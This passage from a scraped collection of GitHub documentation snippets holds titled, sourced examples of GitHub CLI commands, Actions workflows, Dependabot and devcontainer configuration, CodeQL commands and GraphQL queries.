-w`.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\ngh config set SUBCOMMANDS\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh config set editor \"code -w\"\n```\n\n----------------------------------------\n\nTITLE: Defining Container Registry Credentials in YAML\nDESCRIPTION: This YAML snippet defines the credentials for accessing a container registry within a GitHub Actions workflow. It uses `github.actor` for the username and `secrets.github_token` for the password. This allows the action to authenticate with the specified container registry (ghcr.io in this example).\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-running-jobs-in-a-container-credentials.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\ncontainer:\n  image: ghcr.io/owner/image\n  credentials:\n     username: ${{ github.actor }}\n     password: ${{ secrets.github_token }}\n```\n\n----------------------------------------\n\nTITLE: Installing npm Dependencies and Committing Changes\nDESCRIPTION: This sequence of commands installs npm dependencies, adds files to the Git staging area, commits the changes, and pushes them to the remote repository. It requires npm and Git to be installed and configured. This ensures all project dependencies and changes are tracked in the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install\ngit add index.js package.json package-lock.json\ngit commit -m \"initialize npm package\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Creating an Issue using GitHub CLI\nDESCRIPTION: This snippet demonstrates creating a GitHub issue using the `gh issue create` command in the GitHub CLI. It includes the `--title` and `--body` flags to specify the issue's title and description directly, bypassing interactive prompts.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh issue create --title \"My new issue\" --body \"Here are more details.\"\n```\n\n----------------------------------------\n\nTITLE: Setting organization secret with specific repositories via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to set an organization secret and limit access to specific repositories using the `--repos` flag. Comma-separated repository names are provided. Requires GitHub CLI and `admin:org` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh secret set --org ORG_NAME SECRET_NAME --repos REPO-NAME-1, REPO-NAME-2\n```\n\n----------------------------------------\n\nTITLE: Configuring Unbounded Number of Runners\nDESCRIPTION: This snippet shows how to configure an unbounded number of runners by commenting out the `maxRunners` and `minRunners` properties in the `values.yaml` file. This allows ARC to scale up to the number of assigned jobs and scale down to zero when there are no active jobs.  Commenting out these properties results in dynamic scaling based solely on job load.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\n# maxRunners: 0\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\n# minRunners: 0\n```\n\n----------------------------------------\n\nTITLE: Uninstalling a GitHub CLI Extension\nDESCRIPTION: This snippet shows how to uninstall a GitHub CLI extension using the `gh extension remove` subcommand. The `EXTENSION` parameter should be replaced with the name of the extension.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/using-github-cli-extensions.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh extension remove EXTENSION\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_EXTERNAL_PULL_REQUEST_IID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_EXTERNAL_PULL_REQUEST_IID` to the GitHub Actions equivalent `${{ github.event.pull_request.number }}`. Number of pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_73\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.number }}\n```\n\n----------------------------------------\n\nTITLE: Making a file executable using chmod\nDESCRIPTION: This command demonstrates how to change the permissions of a file to make it executable on Linux or macOS systems. This is often needed to ensure that custom scripts can be run by the runner.  The `chmod +x` command adds execute permissions for all users.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/running-scripts-before-or-after-a-job.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nchmod +x PATH/TO/FILE\n```\n\n----------------------------------------\n\nTITLE: Downloading and Analyzing with CodeQL Packs using CLI\nDESCRIPTION: This code snippet demonstrates how to download and analyze a database using CodeQL packs with the `codeql database analyze` command. It includes downloading specific versions of query packs, specifying individual queries to run, and defining the output format.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/customizing-analysis-with-codeql-packs.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ echo $OCTO-ORG_ACCESS_TOKEN | codeql database analyze --download /codeql-dbs/example-repo \\\n    octo-org/security-queries \\\n    octo-org/optional-security-queries@~1.0.1:queries/csrf.ql \\\n    --format=sarif-latest --output=/temp/example-repo-js.sarif\n```\n\n----------------------------------------\n\nTITLE: Using paginate iterator with rest endpoint methods\nDESCRIPTION: This code shows how to use `octokit.paginate.iterator()` with a `rest` endpoint method to iterate through paginated results.  It passes the `octokit.rest.issues.listForRepo` method as the first argument to the iterator function.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nconst iterator = octokit.paginate.iterator(octokit.rest.issues.listForRepo, {\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 100,\n  headers: {\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Auditing Azure DevOps pipelines\nDESCRIPTION: Performs an audit of an Azure DevOps organization using the GitHub Actions Importer CLI.  Fetches all projects and converts each pipeline to its equivalent {% data variables.product.prodname_actions %} workflow, generating a report that summarizes the migration potential.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit azure-devops --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Applying Logging Aspect to Services in main.py (Python)\nDESCRIPTION: This code modifies the `main.py` file to apply the logging aspect defined in `logging_aspect.py` to various service methods using `aspectlib.weave`. It imports the aspect and weaves it into the `process_payment`, `place_order`, `ship_order`, `update_inventory`, and `send_notification` methods of the respective service classes. Requires the `aspectlib` package.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/handling-cross-cutting-concerns.md#_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nimport logging\nfrom logging_config import setup_logging\nfrom payment_service import PaymentService\nfrom order_service import OrderService\nfrom shipping_service import ShippingService\nfrom inventory_service import InventoryService\nfrom notification_service import NotificationService\nfrom logging_aspect import log_method_call\nimport aspectlib\n\ndef main():\n    setup_logging()\n\n    # Apply logging aspect to service methods\n    aspectlib.weave(PaymentService.process_payment, log_method_call)\n    aspectlib.weave(OrderService.place_order, log_method_call)\n    aspectlib.weave(ShippingService.ship_order, log_method_call)\n    aspectlib.weave(InventoryService.update_inventory, log_method_call)\n    aspectlib.weave(NotificationService.send_notification, log_method_call)\n\n    payment_service = PaymentService()\n    order_service = OrderService()\n    shipping_service = ShippingService()\n    inventory_service = InventoryService()\n    notification_service = NotificationService()\n\n    # Example usage\n    payment_service.process_payment({\"amount\": 100, \"currency\": \"USD\"})\n    order_service.place_order({\"item\": \"Book\", \"quantity\": 1})\n    shipping_service.ship_order({\"item\": \"Book\", \"quantity\": 1})\n    inventory_service.update_inventory(\"Book\", -1)\n    notification_service.send_notification(\"Order has been placed and shipped.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with Yarn (Frozen Lockfile)\nDESCRIPTION: This example shows how to install dependencies using Yarn with the `--frozen-lockfile` option. This ensures that the dependencies defined in `yarn.lock` are installed without updating the lock file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: yarn --frozen-lockfile\n```\n\n----------------------------------------\n\nTITLE: Opening Pull Request in Web Browser using gh CLI\nDESCRIPTION: This snippet demonstrates how to open a pull request in the default web browser using the `--web` flag with the `gh pr create` command. This allows creating a pull request using the web UI.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --web\n```\n\n----------------------------------------\n\nTITLE: Creating and Managing Issues via GitHub CLI (Shell)\nDESCRIPTION: This shell script uses the GitHub CLI (`gh`) to create and manage issues. It first checks if the `CLOSE_PREVIOUS` environment variable is set to `true`, and if so, it closes the previous issue with the specified labels and unpins it.  Then, it creates a new issue using the provided title, assignees, labels, and body from environment variables, and optionally pins it. The script relies on the `GH_TOKEN` environment variable for authentication and `GH_REPO` for specifying the repository. Uses `jq` to parse the json response from `gh issue list`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/scheduling-issue-creation.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nif [[ $CLOSE_PREVIOUS == true ]]; then\n  previous_issue_number=$(gh issue list \\\n    --label \"$LABELS\" \\\n    --json number \\\n    --jq '.[0].number')\n  if [[ -n $previous_issue_number ]]; then\n    gh issue close \"$previous_issue_number\"\n    gh issue unpin \"$previous_issue_number\"\n  fi\nfi\nnew_issue_url=$(gh issue create \\\n  --title \"$TITLE\" \\\n  --assignee \"$ASSIGNEES\" \\\n  --label \"$LABELS\" \\\n  --body \"$BODY\")\nif [[ $PINNED == true ]]; then\n  gh issue pin \"$new_issue_url\"\nfi\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Node.js Package Release\nDESCRIPTION: This YAML file defines a GitHub Actions workflow that is triggered when a new release is created. It builds the Node.js package, runs tests, and publishes the package to the GitHub Package Registry. The `NODE_AUTH_TOKEN` environment variable provides authentication for publishing. Requires appropriate permissions to be set for the workflow to write packages and read contents.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nname: Node.js Package\n\non:\n  release:\n    types: [created]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npm test\n\n  publish-gpr:\n    needs: build\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: 20\n          registry-url: {% ifversion ghes %}https://npm.YOUR-HOSTNAME.com/{% else %}https://npm.pkg.github.com/{% endif %}\n      - run: npm ci\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: ${% raw %}{{secrets.GITHUB_TOKEN}}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Creating a Redis Service Container in a GitHub Actions Workflow\nDESCRIPTION: This YAML snippet demonstrates how to define a service container called `redis` within a GitHub Actions workflow job. It specifies the Docker Hub image to use (`redis`) and sets up the job to run within a `node:16-bullseye` Docker container.  The `redis` service container is labeled for easy access from the main container. No port mapping is necessary when both job and service run in containers.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/about-service-containers.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Redis container example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:16-bullseye\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n```\n\n----------------------------------------\n\nTITLE: Rendering Secret Scanning Table for GHES (Liquid Template)\nDESCRIPTION: This code snippet is tailored for GitHub Enterprise Server (GHES) and uses a Liquid template to render a table of supported secret scanning patterns. It iterates through `secretScanningData` and generates table rows showing support for secret scanning alerts, push protection, and validity checks, using octicons to indicate support status.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/introduction/supported-secret-scanning-patterns.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- for entry in secretScanningData %}\n| {{ entry.provider }} | {{ entry.secretType }} | {% if entry.isPrivateWithGhas %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} | {% if entry.hasPushProtection %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} | {% if entry.hasValidityCheck %}{% octicon \"check\" aria-label=\"Supported\" %}{% else %}{% octicon \"x\" aria-label=\"Unsupported\" %}{% endif %} |\n{%- endfor %}\n```\n\n----------------------------------------\n\nTITLE: Querying Repository Issues with GraphQL\nDESCRIPTION: This GraphQL query retrieves the 20 most recent closed issues from the 'octocat/Hello-World' repository. It returns the title, URL, and first 5 labels for each issue. The query uses the repository, issues, and labels objects to access the desired data.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_3\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery {\n  repository(owner:\"octocat\", name:\"Hello-World\") {\n    issues(last:20, states:CLOSED) {\n      edges {\n        node {\n          title\n          url\n          labels(first:5) {\n            edges {\n              node {\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Artifact Retention Period (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure a custom retention period for a specific artifact using the `upload-artifact` action. It sets the retention period for the artifact named 'my-artifact' to 5 days. The `retention-days` value cannot exceed the limits set at the repository, organization, or enterprise level.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n  - name: 'Upload Artifact'\n    uses: {% data reusables.actions.action-upload-artifact %}\n    with:\n      name: my-artifact\n      path: my_file.txt\n      retention-days: 5\n```\n\n----------------------------------------\n\nTITLE: Publishing to crates.io\nDESCRIPTION: This workflow publishes a Rust package to crates.io. It uses a secret to authenticate, builds the package in release mode, packages it as a tarball, and then publishes it using `cargo publish`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n      - name: Login into crates.io\n        run: cargo login {% raw %}${{ secrets.CRATES_IO }}{% endraw %}\n      - name: Build binaries in \"release\" mode\n        run: cargo build -r\n      - name: \"Package for crates.io\"\n        run: cargo package # publishes a package as a tarball\n      - name: \"Publish to crates.io\"\n        run: cargo publish # publishes your crate as a library that can be added as a dependency\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer\nDESCRIPTION: This snippet shows how to configure the GitHub Actions Importer using the `gh actions-importer configure` command. It prompts for GitHub and Bamboo PATs, and base URLs. The command updates environment variables for the tool.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull request review comment\nDESCRIPTION: This workflow triggers when a pull request review comment is created or deleted. It demonstrates using the `pull_request_review_comment` event with the `created` and `deleted` types.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request_review_comment:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Node.js CI Workflow with Artifact Uploads (YAML)\nDESCRIPTION: This YAML configuration defines a GitHub Actions workflow for a Node.js project that builds, tests, and uploads artifacts. It checks out the repository, installs dependencies, builds the project, runs tests, and then uploads the 'dist' directory (excluding markdown files) and a code coverage report as separate artifacts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Node CI\n\non: [push]\n\njobs:\n  build_and_test:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n      - name: npm install, build, and test\n        run: |\n          npm install\n          npm run build --if-present\n          npm test\n      - name: Archive production artifacts\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: dist-without-markdown\n          path: |\n            dist\n            !dist/**/*.md\n      - name: Archive code coverage results\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: code-coverage-report\n          path: output/test/code-coverage.html\n```\n\n----------------------------------------\n\nTITLE: Specifying a Base Image in devcontainer.json (JSON)\nDESCRIPTION: This JSON snippet shows how to specify a base Docker image for a GitHub Codespace using the `image` property within the `devcontainer.json` file. The example uses a JavaScript Node.js image from Microsoft's container registry.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/managing-codespaces-for-your-organization/restricting-the-base-image-for-codespaces.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"image\": \"mcr.microsoft.com/devcontainers/javascript-node:18\"\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Creation Command\nDESCRIPTION: This shell command creates a CodeQL database. It accepts options for specifying the language, source root, build command, and other configurations for the database. The command also supports overwriting existing databases and creating database clusters for multiple languages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-create.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database create [--language=<lang>[,<lang>...]] [--github-auth-stdin] [--github-url=<url>] [--source-root=<dir>] [--threads=<num>] [--ram=<MB>] [--command=<command>] [--extractor-option=<extractor-option-name=value>] <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Configuring Feature Options in devcontainer.json\nDESCRIPTION: Demonstrates how to configure options for a feature within the `devcontainer.json` file, using Terraform as an example. It shows how to specify the version and other properties, like 'tflint', to customize the feature's behavior.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/configuring-dev-containers/adding-features-to-a-devcontainer-file.md#_snippet_1\n\nLANGUAGE: JSONC\nCODE:\n```\n   \"features\": {\n        // ...\n        \"ghcr.io/devcontainers/features/terraform:1\": {\n            \"version\": \"1.1\",\n            \"tflint\": \"latest\"\n        },\n        // ...\n\t}\n```\n\n----------------------------------------\n\nTITLE: Initializing Bundler in a Ruby project\nDESCRIPTION: This command initializes Bundler in a Ruby project by creating a Gemfile. The Gemfile is used to specify the dependencies for the project.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbundle init\n```\n\n----------------------------------------\n\nTITLE: Adding GitHub TrustRoot and ClusterImagePolicy with Helm\nDESCRIPTION: This command adds the GitHub TrustRoot and a ClusterImagePolicy to the Kubernetes cluster using a Helm chart. It enables the policy and sets the organization to `MY-ORGANIZATION`. Replace `MY-ORGANIZATION` with the actual GitHub organization's name. This policy rejects artifacts not originating from the specified GitHub organization.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nhelm upgrade trust-policies --install --atomic \\\n --namespace artifact-attestations \\\n oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\\n --version v0.6.2 \\\n --set policy.enabled=true \\\n --set policy.organization=MY-ORGANIZATION\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Swift Project from Xcode\nDESCRIPTION: This snippet creates a CodeQL database for a Swift project from an Xcode project or workspace. It first cleans the project using `xcodebuild clean -all` and then creates the database.  It assumes Xcode and CodeQL CLI are installed and Xcode is configured properly.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_15\n\nLANGUAGE: shell\nCODE:\n```\nxcodebuild clean -all\ncodeql database create -l swift swift-database\n```\n\n----------------------------------------\n\nTITLE: Defining and Using Registries in dependabot.yml\nDESCRIPTION: This YAML snippet demonstrates how to define a Maven repository registry and how to reference it in a package update configuration. It shows the usage of `registries` at the top level to define the registry and within the `updates` block using `registries: \"*\"` to allow Dependabot to use all defined registries.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/dependabot-updates-registries.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n# registries: gradle-artifactory - provides access details for the gradle-artifactory registry\n# registries: \"*\" - allows {% data variables.product.prodname_dependabot %} to use all the defined registries specified at the top level\n\n{% raw %}\nversion: 2\nregistries:\n  gradle-artifactory:\n    type: maven-repository\n    url: https://acme.jfrog.io/artifactory/my-gradle-registry\n    username: octocat\n    password: ${{secrets.MY_ARTIFACTORY_PASSWORD}}\nupdates:\n  - package-ecosystem: \"gradle\"\n    directory: \"/\"\n    registries: \"*\"\n    schedule:\n      interval: \"monthly\"\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Creating a Java CI workflow with Ant\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow for building and testing Java projects using Ant. It triggers on push and pull request events to the default branch, sets up a JDK environment, and executes the Ant build process.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-ant.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Java CI\n\non:\n  push:\n    branches: [ $default-branch ]\n  pull_request:\n    branches: [ $default-branch ]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set up JDK 11\n      uses: {% data reusables.actions.action-setup-java %}\n      with:\n        java-version: '11'\n        distribution: 'temurin'\n    - name: Build with Ant\n      run: ant -noinput -buildfile build.xml\n```\n\n----------------------------------------\n\nTITLE: Publishing Package to Maven Central and GitHub Packages (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that publishes a package to both the Maven Central Repository and GitHub Packages when a release is created. It sets up Java and Gradle, and executes the `gradle publish` command with the necessary environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-gradle.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nname: Publish package to the Maven Central Repository and GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Java\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Setup Gradle\n        uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n      - name: Publish package\n        run: ./gradlew publish\n        env: {% raw %}\n          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}\n          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Updating a GitHub CLI Extension\nDESCRIPTION: This snippet shows how to update a GitHub CLI extension using the `gh extension upgrade` subcommand. The `EXTENSION` parameter should be replaced with the name of the extension. Use the `--all` flag to update all installed extensions.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/using-github-cli-extensions.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh extension upgrade EXTENSION\n```\n\n----------------------------------------\n\nTITLE: Adding Comment to Issue with GraphQL (Corrected Type)\nDESCRIPTION: This GraphQL mutation adds a comment to an issue, using a string value for the `clientMutationId` field, adhering to the expected data type. This demonstrates the proper use of types in GraphQL mutations, preventing errors caused by type mismatches.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_9\n\nLANGUAGE: graphql\nCODE:\n```\nmutation {\n  addComment(input:{clientMutationId: \"1234\", subjectId: \"MDA6SXNzdWUyMjcyMDA2MTT=\", body: \"Looks good to me!\"}) {\n    clientMutationId\n    commentEdge {\n      node {\n        body\n        repository {\n          id\n          name\n          nameWithOwner\n        }\n        issue {\n          number\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Yarn registry in dependabot.yml\nDESCRIPTION: This snippet configures a Yarn registry in the `dependabot.yml` file. It specifies the registry type, URL, and token using a GitHub secret. This configuration is similar to that of npm.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  yarn-github:\n    type: npm-registry\n    url: https://npm.pkg.github.com\n    token: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Pulling container image by name - Docker CLI\nDESCRIPTION: This command pulls a container image from the GitHub Container Registry by its name and the `latest` tag (if not specified). Replace `NAMESPACE` with the account or organization name and `IMAGE_NAME` with the image name. If no tag is provided, Docker will attempt to pull the `latest` tag by default.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndocker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME\n```\n\n----------------------------------------\n\nTITLE: Ensuring Unique Options in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `options` must be unique\" error. It occurs when the `options` array for a dropdown or checkbox type contains duplicate values. The corrected example ensures that all options within the array are unique.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  attributes:\n    label: Favorite dessert\n    options:\n      - ice cream\n      - ice cream\n      - pie\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  attributes:\n    label: Favorite dessert\n    options:\n      - ice cream\n      - pie\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for Swift Project with Swift Build\nDESCRIPTION: This snippet demonstrates creating a CodeQL database for a Swift project built with `swift build`.  It executes the `swift build` command directly. It assumes Swift and CodeQL CLI are installed and the project is set up for Swift Package Manager.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_16\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create -l swift -c \"swift build\" swift-database\n```\n\n----------------------------------------\n\nTITLE: Setting global email address in Git\nDESCRIPTION: Sets the email address to be used for all Git repositories on your computer. This command modifies the global Git configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-email-preferences/setting-your-commit-email-address.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit config --global user.email \"YOUR_EMAIL\"\n```\n\n----------------------------------------\n\nTITLE: Migrate Azure DevOps Release Pipeline to GitHub Actions\nDESCRIPTION: This command migrates an Azure DevOps release pipeline to a GitHub Actions workflow. It requires the pipeline ID, the target GitHub repository URL, and an output directory. The command opens a pull request with the converted workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer migrate azure-devops release --pipeline-id :pipeline_id --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom TLS Certificates\nDESCRIPTION: This snippet configures custom TLS certificates by specifying the certificate location in a config map and setting the runner mount path. It sets the `NODE_EXTRA_CA_CERTS` environment variable and `RUNNER_UPDATE_CA_CERTS` to instruct the runner to reload certificates. Requires a configmap with a ca.crt key.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\ngithubServerTLS:\n  certificateFrom:\n    configMapKeyRef:\n      name: config-map-name\n      key: ca.crt\n  runnerMountPath: /usr/local/share/ca-certificates/\n```\n\n----------------------------------------\n\nTITLE: Adding NuGet Source for Publishing\nDESCRIPTION: This command configures NuGet to use GitHub Packages as a package source for publishing. It requires specifying the owner's 